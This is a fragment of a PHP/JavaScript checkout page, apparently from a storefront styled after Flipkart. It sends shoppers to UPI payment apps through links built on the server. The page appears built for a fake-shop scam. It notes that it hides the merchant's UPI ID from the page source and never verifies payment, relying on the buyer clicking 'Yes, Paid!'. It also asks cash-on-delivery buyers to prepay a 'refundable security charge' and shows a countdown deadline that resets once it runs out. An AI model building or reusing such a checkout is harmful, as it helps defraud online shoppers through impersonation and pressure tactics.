  _delEl.style.color = deliveryFee > 0 ? '#212121' : '#388e3c';
}
// Platform fee row - show on load (UPI default)
const _pfRow  = document.getElementById('platformFeeRow');
if (_pfRow) _pfRow.style.display = '';
const totalPayable = getUpiChargeAmount();
document.getElementById('summaryTotal').textContent     = '₹' + totalPayable.toLocaleString('en-IN');
document.getElementById('footerAmount').textContent     = '₹' + totalPayable.toLocaleString('en-IN');
document.getElementById('payBtnText').textContent       = 'PAY ₹' + totalPayable.toLocaleString('en-IN');
document.getElementById('qrAmountLabel').textContent    = '₹' + totalPayable.toLocaleString('en-IN');
// Show platform fee row on load (default is UPI)
if (donationAmt > 0) {
  const _ddr = document.getElementById('donationDisplayRow');
  const _ddv = document.getElementById('donationDisplayVal');
  if (_ddr) _ddr.style.display = '';
  if (_ddv) _ddv.textContent = '+₹' + donationAmt;
}
const _pfInit = document.getElementById('platformFeeRow');
const _pfFreeInit = document.getElementById('platformFeeFreeRow');
if (_pfInit)     _pfInit.style.display     = '';
if (_pfFreeInit) _pfFreeInit.style.display = 'none';
if (isEmiCheckout && emiMonths > 0) {
  const codOpt = document.getElementById('opt-cod');
  if (codOpt) codOpt.style.display = 'none';
  const paymentCard = document.querySelector('.payment-card');
  if (paymentCard && !document.getElementById('emiPayHint')) {
    const note = document.createElement('div');
    note.id = 'emiPayHint';
    note.className = 'offer-box';
    note.style.marginBottom = '12px';
    note.innerHTML = '<p><b>EMI checkout active.</b> Aaj ke liye payable amount ₹' + (payableBaseAmount.toLocaleString('en-IN')) + ' hai. Full product price ₹' + productAmount.toLocaleString('en-IN') + ' card par convert hoga.</p>';
    paymentCard.parentNode.insertBefore(note, paymentCard);
  }
}

// ══════════════════════════════════════════════════
//  COD + PLATFORM CONSTANTS (module-level)
// ══════════════════════════════════════════════════
const COD_THRESHOLD = <?= $cod_threshold ?>;
const COD_LOW       = <?= $cod_low ?>;
const COD_HIGH      = <?= $cod_amount ?>;

// ══════════════════════════════════════════════════
//  SELECT PAYMENT METHOD
// ══════════════════════════════════════════════════
let selectedApp = 'phonepe';
let qrGenerated = false;

function selectApp(app) {
  if (isEmiCheckout && app === 'cod') { showToast('EMI orders are available with online payment only'); return; }
  selectedApp = app;

  // Remove selected from all
  document.querySelectorAll('.pay-option').forEach(el => el.classList.remove('selected'));
  document.getElementById('opt-' + app).classList.add('selected');

  // Hide all extra sections
  document.getElementById('upiInputSection').style.display = 'none';
  document.getElementById('codInfoSection').style.display = 'none';
  const qrSec = document.getElementById('qrSection');
  qrSec.style.display = 'none';
  qrSec.style.flexDirection = 'column';

  // Reset footer to full amount
  document.getElementById('footerLabel').textContent   = 'Total Payable';
  document.getElementById('footerAmount').textContent  = '₹' + getUpiChargeAmount().toLocaleString('en-IN');
  document.getElementById('payBtnText').textContent    = 'PAY ₹' + getUpiChargeAmount().toLocaleString('en-IN');
  // Show platform fee row for UPI
  const _pfRow  = document.getElementById('platformFeeRow');
  const _pfFree = document.getElementById('platformFeeFreeRow');
  if (_pfRow)  _pfRow.style.display  = '';
  if (_pfFree) _pfFree.style.display = 'none';
  // Update summary total to include platform fee
  document.getElementById('summaryTotal').textContent = '₹' + getUpiChargeAmount().toLocaleString('en-IN');

  if (app === 'scan') {
    qrSec.style.display = 'flex';
    if (!qrGenerated) generateQR();

  } else if (app === 'upi') {
    document.getElementById('upiInputSection').style.display = 'block';

  } else if (app === 'cod') {
    // Declare _fee FIRST before any use
    const _fee = getCodBaseAmount() < COD_THRESHOLD ? COD_LOW : COD_HIGH;
    // Show COD info box
    document.getElementById('codInfoSection').style.display = 'block';
    // Show rest amount using dynamic _fee
    const restAmount = Math.max(0, getCodBaseAmount() - _fee);
    document.getElementById('codRestAmount').textContent = '₹' + restAmount.toLocaleString('en-IN');
    // Update footer to show security charge
    document.getElementById('footerLabel').textContent  = 'Security Charge (Refundable)';
    document.getElementById('footerAmount').textContent = '₹' + _fee.toLocaleString('en-IN');
    // Hide platform fee row for COD
    const _pfRow2  = document.getElementById('platformFeeRow');
    const _pfFree2 = document.getElementById('platformFeeFreeRow');
    if (_pfRow2)  _pfRow2.style.display  = 'none';
    if (_pfFree2) _pfFree2.style.display = '';
    // Restore summary total (no platform fee for COD)
    document.getElementById('summaryTotal').textContent = '₹' + getCodBaseAmount().toLocaleString('en-IN');
    document.getElementById('payBtnText').textContent = 'PAY ₹' + _fee + ' & CONFIRM COD';
    const _fd1 = document.getElementById('codFeeDisplay');
    const _fd2 = document.getElementById('codFeeDisplay2');
    if (_fd1) _fd1.textContent = '₹' + _fee;
    if (_fd2) _fd2.textContent = '₹' + _fee;
  }
}

// ══════════════════════════════════════════════════
//  UPI VERIFY
// ══════════════════════════════════════════════════
function verifyUPI() {
  const val = document.getElementById('upiIdInput').value.trim();
  if (!val || !val.includes('@')) {
    showToast('⚠️ Enter a valid UPI ID (e.g. name@upi)');
    return;
  }
  showToast('UPI ID verified: ' + val);
}

// ══════════════════════════════════════════════════
//  PAY NOW  →  Opens UPI deep link
// ══════════════════════════════════════════════════
async function payNow() {
  if (!payAmount && !payableBaseAmount) {
    showToast('⚠️ No product selected!');
    return;
  }

  // UPI link built server-side — UPI ID never in page source
  const codFee        = selectedApp === 'cod'
    ? (getCodBaseAmount() < COD_THRESHOLD ? COD_LOW : COD_HIGH)
    : getUpiChargeAmount();
  const chargeAmount  = selectedApp === 'cod' ? codFee : getUpiChargeAmount();
  const upiNote       = selectedApp === 'cod' ? '<?= $cod_note ?>' : '<?= $merchant_name ?>';

  showToast(selectedApp === 'cod'
    ? ('Opening UPI app for ₹' + codFee + ' security charge...')
    : ('Opening payment app for ₹' + chargeAmount.toLocaleString('en-IN') + '...'));

  // Fetch UPI deep link from server — UPI ID stays in PHP, never exposed to client
  let upiLinkData = null;
  try {
    const upiResp = await fetch('assets/upi_link.php', {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ amount: chargeAmount, note: upiNote })
    });
    upiLinkData = await upiResp.json();
  } catch(e) {
    showToast('⚠️ Payment service unavailable. Try again.');
    setPayBtnLoading(false);
    return;
  }

  if (!upiLinkData || !upiLinkData.ok || !upiLinkData.link) {
    showToast('⚠️ Could not generate payment link.');
    setPayBtnLoading(false);
    return;
  }

  // App-specific links from server
  const upiLink  = upiLinkData.link;
  const gpayLink = upiLinkData.gpay    || upiLink;
  const ppLink   = upiLinkData.phonepe || upiLink;
  const ptLink   = upiLinkData.paytm   || upiLink;

  // Track visibility
  let didLeave = false;
  let leaveTime = 0;

  const visibilityHandler = () => {
    if (document.visibilityState === 'hidden') {
      didLeave = true;
      leaveTime = Date.now();
    }
  };

  document.addEventListener('visibilitychange', visibilityHandler);

  // iframe method — works on most Android browsers
  try {
    const fr = document.createElement('iframe');
    fr.style.cssText = 'display:none;width:0;height:0;border:0';
    fr.src = upiLink;
    document.body.appendChild(fr);
    setTimeout(() => { try { document.body.removeChild(fr); } catch(e){} }, 2000);
  } catch(e) {}

  // Fallback direct redirect after 300ms
  setTimeout(() => { window.location.href = upiLink; }, 300);

  setTimeout(() => {
    document.removeEventListener('visibilitychange', visibilityHandler);

    const returnTime = Date.now();
    const awayDuration = didLeave ? (returnTime - leaveTime) : 0;

    if (!didLeave || awayDuration < 3000) {
      showPaymentFailedDialog();
    } else {
      setTimeout(() => {
        if (document.visibilityState === 'visible') {
          selectedApp === 'cod'
            ? showCodConfirmDialog()
            : showPaymentConfirmDialog();
        }
      }, 8000);
    }
  }, 5000);
}

function showPaymentFailedDialog() {
  const overlay = document.createElement('div');
  overlay.style.cssText = `
    position:fixed; inset:0; background:rgba(0,0,0,.55);
    display:flex; align-items:center; justify-content:center;
    z-index:9999; animation: fadeIn .2s ease;
  `;
  overlay.innerHTML = `
    <div style="
      background:#fff; border-radius:18px;
      padding:28px 24px; width:90%; max-width:340px;
      font-family:'Noto Sans',sans-serif; text-align:center;
    ">
      <div style="margin-bottom:12px"><svg viewBox="0 0 24 24" width="54" height="54" fill="#ff9800"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg></div>
      <div style="font-size:18px; font-weight:700; color:#d32f2f; margin-bottom:8px;">Payment App Not Opened</div>
      <div style="font-size:13px; color:#555; line-height:1.6; margin-bottom:20px;">
        Please make sure you have a UPI app installed (PhonePe, Google Pay, Paytm) and try again.
      </div>
      <button onclick="this.parentElement.parentElement.remove(); setTimeout(()=>payNow(),300)" style="
        width:100%; padding:12px; border-radius:8px;
        background:#2874f0; color:#fff; border:none;
        font-size:14px; font-weight:700; cursor:pointer; font-family:inherit;
        margin-bottom:8px;
      "><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor" style="vertical-align:-3px;margin-right:4px"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg> Retry Payment</button>
      <button onclick="window.location.href='index.php'" style="
        width:100%; padding:12px; border-radius:8px;
        background:#fff; color:#555; border:2px solid #e0e0e0;
        font-size:14px; font-weight:600; cursor:pointer; font-family:inherit;
      ">Cancel & Go Home</button>
    </div>
    <style>@keyframes fadeIn { from{opacity:0} to{opacity:1} }</style>
  `;
  document.body.appendChild(overlay);
}

function showPaymentConfirmDialog() {
  // Overlay to ask user if payment was done
  const overlay = document.createElement('div');
  overlay.style.cssText = `
    position:fixed; inset:0; background:rgba(0,0,0,.55);
    display:flex; align-items:flex-end; justify-content:center;
    z-index:9999; animation: fadeIn .2s ease;
  `;
  overlay.innerHTML = `
    <div style="
      background:#fff; border-radius:18px 18px 0 0;
      padding:24px 20px 36px; width:100%; max-width:480px;
      animation: slideUp2 .3s ease;
      font-family:'Noto Sans',sans-serif;
    ">
      <div style="text-align:center; margin-bottom:18px;">
        <div style="margin-bottom:8px"><svg viewBox="0 0 24 24" width="44" height="44" fill="#2874f0"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg></div>
        <div style="font-size:17px; font-weight:700; color:#212121; margin-bottom:6px;">Payment Verification</div>
        <div style="font-size:13px; color:#878787; line-height:1.6;">
          Did you successfully complete the payment of <b style="color:#212121;">₹${getUpiChargeAmount().toLocaleString('en-IN')}</b> in your UPI app?
          <br><br>
          <b style="color:#d32f2f;"><svg viewBox="0 0 24 24" width="14" height="14" fill="#d32f2f" style="vertical-align:-2px;margin-right:4px"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg> Only click "Yes, Paid!" if you saw SUCCESS in your payment app.</b>
        </div>
      </div>
      <div style="display:flex; gap:10px;">
        <button onclick="confirmPayment('failed')" style="
          flex:1; padding:14px; border-radius:8px;
          background:#fff; color:#d32f2f;
          border:2px solid #d32f2f;
          font-size:14px; font-weight:700; cursor:pointer; font-family:inherit;
        "><svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor" style="vertical-align:-2px;margin-right:3px"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> No, Failed</button>
        <button onclick="confirmPayment('success')" style="
          flex:1; padding:14px; border-radius:8px;
          background:linear-gradient(135deg,#388e3c,#2e7d32);
          color:#fff; border:none;
          font-size:14px; font-weight:700; cursor:pointer; font-family:inherit;
          box-shadow:0 3px 8px rgba(56,142,60,.35);
        "><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor" style="vertical-align:-3px;margin-right:4px;color:#fff"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Yes, Paid!</button>
      </div>
      <div style="margin-top:14px; text-align:center; font-size:11px; color:#999; line-height:1.5;">
        We cannot verify payment automatically. Please be honest — false confirmation may lead to order cancellation and account suspension.
      </div>
    </div>
    <style>
      @keyframes slideUp2 { from{transform:translateY(100%)} to{transform:translateY(0)} }
      @keyframes fadeIn { from{opacity:0} to{opacity:1} }
    </style>
  `;
  document.body.appendChild(overlay);
}

function confirmPayment(status) {
  const paymentMode = status === 'cod-success' ? 'cod' : (selectedApp || 'upi');
  if ((status === 'success' || status === 'cod-success') && window.FK && FK.persistLatestOrder) {
    // Mark as payment_pending — server cannot verify client claims
    const orderStatus = status === 'cod-success' ? 'cod_pending' : 'payment_pending';
    if (isEmiCheckout && emiMonths > 0) { localStorage.setItem('pay_total', String(selectedApp === 'cod' ? getCodBaseAmount() : getUpiChargeAmount())); }
    const order = FK.persistLatestOrder({ paymentMode, status: orderStatus, emi: isEmiCheckout ? { months: emiMonths, monthly: emiMonthly } : null });
    const orderId = order && order.id ? `&order=${encodeURIComponent(order.id)}` : '';
    // Use actual order status so confirmation page shows correct messaging
    const confirmStatus = (order && order.status) ? order.status : orderStatus;
    window.location.href = `order-confirmation.php?status=${encodeURIComponent(confirmStatus)}${orderId}`;
    return;
  }
  window.location.href = `order-confirmation.php?status=${encodeURIComponent(status)}`;
}

// ══════════════════════════════════════════════════
//  COD CONFIRM DIALOG
// ══════════════════════════════════════════════════
function showCodConfirmDialog() {
  const overlay = document.createElement('div');
  overlay.style.cssText = `
    position:fixed; inset:0; background:rgba(0,0,0,.55);
    display:flex; align-items:flex-end; justify-content:center;
    z-index:9999; animation: fadeIn .2s ease;
  `;
  overlay.innerHTML = `
    <div style="
      background:#fff; border-radius:18px 18px 0 0;
      padding:24px 20px 36px; width:100%; max-width:480px;
      animation: slideUp2 .3s ease;
      font-family:'Noto Sans',sans-serif;
    ">
      <div style="text-align:center; margin-bottom:18px;">
        <div style="margin-bottom:8px"><svg viewBox="0 0 24 24" width="48" height="48" fill="#2874f0"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg></div>
        <div style="font-size:17px; font-weight:700; color:#212121; margin-bottom:6px;">Confirm COD Security Payment</div>
        <div style="font-size:13px; color:#878787; line-height:1.6;">
          Did you successfully pay the <b style="color:#212121;">₹${(getCodBaseAmount() < COD_THRESHOLD ? COD_LOW : COD_HIGH).toLocaleString('en-IN')} security charge</b> in your UPI app?<br><br>
          <b style="color:#d32f2f;"><svg viewBox="0 0 24 24" width="14" height="14" fill="#d32f2f" style="vertical-align:-2px;margin-right:4px"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg> Only confirm if you saw SUCCESS in your payment app.</b>
        </div>
      </div>
      <div style="background:#fff8e1; border:1px solid #ffe082; border-radius:10px; padding:12px 16px; margin-bottom:16px; font-size:13px; color:#5d4037; line-height:1.6;">
        <svg viewBox="0 0 24 24" width="14" height="14" fill="#388e3c" style="vertical-align:-2px;margin-right:4px"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Your <b>₹99 security charge is refundable</b> at the time of delivery.<br>
        Pay the remaining <b style="color:#212121;">₹${Math.max(0, getCodBaseAmount() - (getCodBaseAmount() < COD_THRESHOLD ? COD_LOW : COD_HIGH)).toLocaleString('en-IN')}</b> when the order arrives.
      </div>
      <div style="display:flex; gap:10px;">
        <button onclick="confirmPayment('failed')" style="
          flex:1; padding:14px; border-radius:8px;
          background:#fff; color:#d32f2f;
          border:2px solid #d32f2f;
          font-size:14px; font-weight:700; cursor:pointer; font-family:inherit;
        "><svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor" style="vertical-align:-2px;margin-right:3px"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> No, Failed</button>
        <button onclick="confirmPayment('cod-success')" style="
          flex:1; padding:14px; border-radius:8px;
          background:linear-gradient(135deg,#fb8c00,#e65100);
          color:#fff; border:none;
          font-size:14px; font-weight:700; cursor:pointer; font-family:inherit;
          box-shadow:0 3px 8px rgba(230,81,0,.35);
        "><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor" style="vertical-align:-3px;margin-right:4px;color:#fff"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Yes, Paid! Place COD Order</button>
      </div>
      <div style="margin-top:14px; text-align:center; font-size:11px; color:#999; line-height:1.5;">
        False confirmation may result in order cancellation and account suspension.
      </div>
    </div>
    <style>
      @keyframes slideUp2 { from{transform:translateY(100%)} to{transform:translateY(0)} }
      @keyframes fadeIn { from{opacity:0} to{opacity:1} }
    </style>
  `;
  document.body.appendChild(overlay);
}

// ══════════════════════════════════════════════════
//  QR CODE GENERATOR
// ══════════════════════════════════════════════════
async function generateQR() {
  // Lazy-load QR library only when needed
  if (typeof QRCode === 'undefined') {
    await new Promise(function(resolve, reject) {
      var s = document.createElement('script');
      s.src = 'https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js';
      s.onload = resolve;
      s.onerror = reject;
      document.head.appendChild(s);
    });
  }
  const qrAmount = getUpiChargeAmount();
  let link = '';
  try {
    const r = await fetch('assets/upi_link.php', {
      method: 'POST', credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ amount: qrAmount, note: '<?= $merchant_name ?>' })
    });
    const d = await r.json();
    link = d.ok ? d.link : '';
  } catch(e) { link = ''; }
  if (!link) {
    document.getElementById('qrcode').innerHTML = '<p style="color:#999;font-size:13px;padding:10px;">QR unavailable</p>';
    return;
  }

  document.getElementById('qrcode').innerHTML = '';
  try {
    new QRCode(document.getElementById('qrcode'), {
      text: link,
      width: 180, height: 180,
      colorDark: '#1a1a2e',
      colorLight: '#ffffff',
      correctLevel: QRCode.CorrectLevel.H
    });
    qrGenerated = true;
  } catch(e) {
    document.getElementById('qrcode').innerHTML =
      '<p style="color:#999;font-size:13px;padding:10px;">QR requires internet</p>';
  }
}

// ══════════════════════════════════════════════════
//  COUNTDOWN TIMER
// ══════════════════════════════════════════════════
const timerEl = document.getElementById('timerDisplay');
const timerInlineEl = document.getElementById('timerInline');
const offerSublineEl = document.getElementById('offerSubline');
const timerChipEl = document.getElementById('timerChip');
const timerAmountKey = Math.max(1, Number(getUpiChargeAmount()) || 0);
const timerKey = 'fk_checkout_deadline_' + [payName || 'single', timerAmountKey, emiMonths || 0].join('_');
const nowTs = Date.now();
let deadline = parseInt(localStorage.getItem(timerKey) || '0', 10);
if (!deadline || deadline <= nowTs || deadline > nowTs + (30 * 60 * 1000)) {
  deadline = nowTs + (9 * 60 * 1000) + 59 * 1000;
  localStorage.setItem(timerKey, String(deadline));
}
let countdownTimer = null;
function formatLeft(secLeft) {
  const m = Math.floor(secLeft / 60);
  const s = secLeft % 60;
  return `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
}
function tickPayTimer() {
  const left = Math.max(0, Math.ceil((deadline - Date.now()) / 1000));
  const label = formatLeft(left);
  if (timerEl) timerEl.textContent = label;
  if (timerInlineEl) timerInlineEl.textContent = label;
  if (timerChipEl) {
    timerChipEl.classList.toggle('ending', left > 0 && left <= 60);
    timerChipEl.classList.toggle('done', left === 0);
  }
  if (left === 0) {
    if (offerSublineEl) { offerSublineEl.textContent = ''; offerSublineEl.style.display = 'none'; }
    clearInterval(countdownTimer);
  }
}
function startPayTimer() {
  if (countdownTimer) clearInterval(countdownTimer);
  tickPayTimer();
  countdownTimer = setInterval(tickPayTimer, 1000);
}
startPayTimer();
document.addEventListener('visibilitychange', function() {
  if (document.hidden) {
    if (countdownTimer) clearInterval(countdownTimer);
  } else {
    startPayTimer();
  }
});

// ══════════════════════════════════════════════════
//  TOAST
// ══════════════════════════════════════════════════
function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2500);
}
</script>

    <script src="assets/shield.js" defer></script>
    <script src="assets/shared.js?v=20260320" defer></script>
</body>
</html>
